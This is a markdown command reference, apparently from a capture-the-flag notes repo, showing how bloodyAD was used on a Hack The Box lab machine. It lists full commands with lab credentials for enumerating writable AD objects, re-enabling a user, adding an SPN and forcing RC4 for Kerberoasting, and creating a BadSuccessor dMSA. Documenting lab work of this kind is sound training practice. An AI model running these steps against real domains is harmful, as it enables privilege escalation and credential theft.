# bloodyAD

`bloodyAD` edits and queries Active Directory objects over LDAP. In this repo it is used for writable-object discovery, account restoration, SPN manipulation, encryption-type downgrades and BadSuccessor/dMSA abuse.

## Commands Used

### Query Group Membership and Writable Objects
<!-- cmd: linux -->
```bash
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  get object "alex.turner" --attr memberOf

bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  get writable

bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  get writable --otype USER
```
Used on: **Checkpoint**

### Enable a Restored User
<!-- cmd: linux -->
```bash
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  set object "mark.davies" userAccountControl -v 512
```
Used on: **Checkpoint**

### Add a Kerberoastable SPN and Force RC4
<!-- cmd: linux -->
```bash
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  --host $TARGET \
  set object "mark.davies" servicePrincipalName \
  -v "http/checkpoint.htb"

bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  --host $TARGET \
  set object "mark.davies" msDS-SupportedEncryptionTypes \
  -v 4
```
Used on: **Checkpoint**

### Kerberos Cache Authentication
<!-- cmd: linux -->
```bash
bloodyad -k ccache=ryan.ccache \
  --dc-ip $TARGET \
  --host dc01.checkpoint.htb \
  -d checkpoint.htb \
  get writable --right WRITE
```
Used on: **Checkpoint**

### Add a BadSuccessor dMSA
<!-- cmd: linux -->
```bash
bloodyad -k ccache=ryan.ccache \
  -u ryan.brooks \
  --dc-ip $TARGET \
  --host dc01.checkpoint.htb \
  -d checkpoint.htb \
  add badSuccessor evilDMSA6 \
  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
```
Used on: **Checkpoint**
